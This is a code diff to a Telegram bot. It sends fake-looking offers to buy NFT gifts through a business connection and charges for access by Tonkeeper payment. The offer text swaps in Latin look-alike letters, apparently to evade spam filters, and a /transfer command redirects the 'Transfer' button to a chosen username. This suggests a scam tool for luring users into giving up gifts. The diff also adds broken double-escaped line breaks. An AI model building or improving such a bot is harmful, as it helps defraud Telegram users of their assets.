@@ -18,7 +18,7 @@ from database import Database
 from offer import (ACCEPT_EMOJI_ID, DECLINE_EMOJI_ID, GIFT_EMOJI_ID, TRANSFER_EMOJI_ID,
                    PREMIUM_EMOJI_ID, DONE_EMOJI_ID, STARS_EMOJI_ID, GRAM_EMOJI_ID,
                    display_amount, format_remaining, gift_title, make_expiry, parse_offer)
-from payment import CryptoBotAPI, TonkeeperAPI
+from payment import TonkeeperAPI
 
 logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s")
 log = logging.getLogger("offerbot")
@@ -40,14 +40,14 @@ def display_name(user) -> str:
 
 def instruction(locale="ru"):
     return (
-        "<b>ОСНОВНАЯ КОМАНДА НА РУССКОМ ЯЗЫКЕ:</b>\n"
-        "<blockquote>Оф https://t.me/nft/PartySparkler-140864 150 stars</blockquote>\n"
-        "<b>Доступные языки:</b>\n\n"
-        "Английский\n<blockquote>В конце команды: англ/en</blockquote>\n"
-        "Арабский\n<blockquote>В конце команды: араб</blockquote>\n"
-        "Китайский\n<blockquote>В конце команды: кидай</blockquote>\n\n"
-        "<b>Изменить профиль в кнопке «Передать» по команде:</b>\n"
-        "<blockquote>/transfer @username</blockquote>"
+        "<b>ОСНОВНАЯ КОМАНДА НА РУССКОМ ЯЗЫКЕ:</b>\\n"
+        "<blockquote><code>оф https://t.me/nft/PartySparkler-140864 150 stars</code></blockquote>\\n"
+        "<b>Доступные языки:</b>\\n\\n"
+        "Английский\\n<blockquote>В конце команды: англ/en</blockquote>\\n"
+        "Арабский\\n<blockquote>В конце команды: араб</blockquote>\\n"
+        "Китайский\\n<blockquote>В конце команды: кидай</blockquote>\\n\\n"
+        "<b>Изменить профиль в кнопке «Передать» по команде:</b>\\n"
+        "<blockquote><code>/transfer @username</code></blockquote>"
     )
 
 
@@ -243,14 +243,13 @@ async def process_offer(message: Message, business_connection_id: str | None = N
     elif parsed["locale"] == "ar":
         body = f"المستخدم <b>{seller_name}</b> يعرض <b>{amount}</b> مقابل الهدية <a href=\"{parsed['gift_url']}\">{title}</a>.\n\nينتهي العرض خلال <b>{remaining}</b>."
     else:
-        body = f"Пoльзoвaтeль <b>{seller_name}</b> прeдлaгaeт Вaм <b>{amount}</b> зa пoдaрoк <a href=\"{parsed['gift_url']}\">{title}</a>.\n\nСдeлкa aктивнa <b>{remaining}</b>.\n\nПредложение актуально в течении 23ч 59м…"
+        body = f"Пoльзoвaтeль <b>{seller_name}</b> прeдлaгaeт Вaм <b>{amount}</b> зa пoдaрoк <a href=\"{parsed['gift_url']}\">{title}</a>.\n\nСдeлкa aктивнa <b>{remaining}</b>."
     markup = offer_keyboard(offer_id, parsed["locale"], parsed["currency"])
     log.info("OFFER_SEND_REQUEST offer_id=%s chat_id=%s business_connection_id=%s", offer_id, buyer_id, business_connection_id)
     log.info("REPLY_MARKUP_PRESENT offer_id=%s present=%s", offer_id, bool(markup and markup.inline_keyboard))
     try:
         sent = await safe_send_business(business_connection_id, buyer_id, text=body,
-            reply_markup=markup,
-            link_preview_options=LinkPreviewOptions(url=parsed["gift_url"], show_above_text=True))
+            reply_markup=markup)
         log.info("OFFER_SEND_SUCCESS offer_id=%s telegram_message_id=%s", offer_id, sent.message_id)
         log.info("OFFER_MESSAGE_ID offer_id=%s message_id=%s chat_id=%s", offer_id, sent.message_id, buyer_id)
     except Exception as e:
@@ -484,13 +483,6 @@ async def show_payment_options(message: Message, user_id: int, payment: dict):
     
     keyboard = []
     
-    # CryptoBot
-    if cfg.cryptobot_token:
-        keyboard.append([InlineKeyboardButton(
-            text="💳 Оплатить через CryptoBot",
-            callback_data=f"pay:crypto:{payment_id}"
-        )])
-    
     # Tonkeeper
     if cfg.ton_wallet:
         keyboard.append([InlineKeyboardButton(
@@ -505,75 +497,13 @@ async def show_payment_options(message: Message, user_id: int, payment: dict):
     
     keyboard.append([InlineKeyboardButton(
         text="« Назад",
-        callback_data="my_profile"
+        callback_data="back_to_start"
     )])
     
     try:
         await message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=keyboard))
     except Exception:
         await message.answer(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=keyboard))
-
-
-@dp.callback_query(F.data.startswith("pay:crypto:"))
-async def pay_crypto_callback(call: CallbackQuery):
-    """Оплата через CryptoBot"""
-    if not call.from_user or not cfg.cryptobot_token:
-        await call.answer("Ошибка", show_alert=True)
-        return
-    
-    payment_id = int(call.data.split(":")[2])
-    payment = db.get_payment_by_id(payment_id)
-    
-    if not payment or payment['user_id'] != call.from_user.id:
-        await call.answer("Платёж не найден", show_alert=True)
-        return
-    
-    if payment['status'] == 'paid':
-        await call.answer("✅ Уже оплачено!", show_alert=True)
-        return
-    
-    await call.answer("Создаю счёт...", show_alert=False)
-    
-    # Создаём счёт в CryptoBot
-    crypto_api = CryptoBotAPI(cfg.cryptobot_token)
-    invoice = await crypto_api.create_invoice(
-        amount=payment['amount'],
-        currency="GRAM",
-        description=f"Доступ к OfferBot #{payment_id}"
-    )
-    
-    if not invoice:
-        await call.answer("❌ Ошибка создания счёта", show_alert=True)
-        return
-    
-    invoice_id = invoice.get('invoice_id')
-    pay_url = invoice.get('bot_invoice_url') or invoice.get('mini_app_invoice_url')
-    
-    if not pay_url:
-        await call.answer("❌ Ошибка получения ссылки", show_alert=True)
-        return
-    
-    # Сохраняем данные счёта
-    db.set_payment_provider_data(payment_id, str(invoice_id), pay_url)
-    
-    text = (
-        "<b>💳 ОПЛАТА ЧЕРЕЗ CRYPTOBOT</b>\n\n"
-        f"<b>Сумма:</b> {payment['amount']:g} Gram\n"
-        f"<b>Номер платежа:</b> <code>{payment_id}</code>\n\n"
-        "Нажмите кнопку ниже для оплаты.\n"
-        "После оплаты нажмите <b>🔄 Проверить оплату</b>"
-    )
-    
-    keyboard = [
-        [InlineKeyboardButton(text="💳 Оплатить", url=pay_url)],
-        [InlineKeyboardButton(text="🔄 Проверить оплату", callback_data=f"pay:check:{payment_id}")],
-        [InlineKeyboardButton(text="« Назад", callback_data="buy_access")]
-    ]
-    
-    try:
-        await call.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=keyboard))
-    except Exception:
-        await call.message.answer(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=keyboard))
 
 
 @dp.callback_query(F.data.startswith("pay:ton:"))
@@ -598,7 +528,8 @@ async def pay_ton_callback(call: CallbackQuery):
     amount = payment['amount']
     
     # Формируем ссылку для Tonkeeper
-    ton_url = f"ton://transfer/{cfg.ton_wallet}?amount={int(amount * 1_000_000_000)}&text={memo}"
+    from urllib.parse import quote
+    ton_url = f"https://app.tonkeeper.com/transfer/{cfg.ton_wallet}?amount={int(amount * 1_000_000_000)}&text={quote(memo, safe='')}"
     
     text = (
         "<b>💎 ОПЛАТА ЧЕРЕЗ TONKEEPER</b>\n\n"
@@ -610,7 +541,7 @@ async def pay_ton_callback(call: CallbackQuery):
     ).format(memo)
     
     keyboard = [
-        [InlineKeyboardButton(text="💎 Открыть Tonkeeper", url=ton_url)],
+        [InlineKeyboardButton(text="💎 Оплатить через TonKeepr", url=ton_url)],
         [InlineKeyboardButton(text="🔄 Проверить оплату", callback_data=f"pay:check:{payment_id}")],
         [InlineKeyboardButton(text="« Назад", callback_data="buy_access")]
     ]
@@ -651,16 +582,8 @@ async def pay_check_callback(call: CallbackQuery):
     
     paid = False
     
-    # Проверяем CryptoBot
-    if payment.get('provider_invoice_id') and cfg.cryptobot_token:
-        crypto_api = CryptoBotAPI(cfg.cryptobot_token)
-        invoice = await crypto_api.check_invoice(int(payment['provider_invoice_id']))
-        
-        if invoice and invoice.get('status') == 'paid':
-            paid = True
-    
     # Проверяем Tonkeeper
-    elif cfg.ton_wallet:
+    if cfg.ton_wallet:
         ton_api = TonkeeperAPI(cfg.ton_wallet)
         # Конвертируем Gram в TON (1 Gram = 1 TON)
         paid = await ton_api.check_transaction(payment['memo'], payment['amount'])
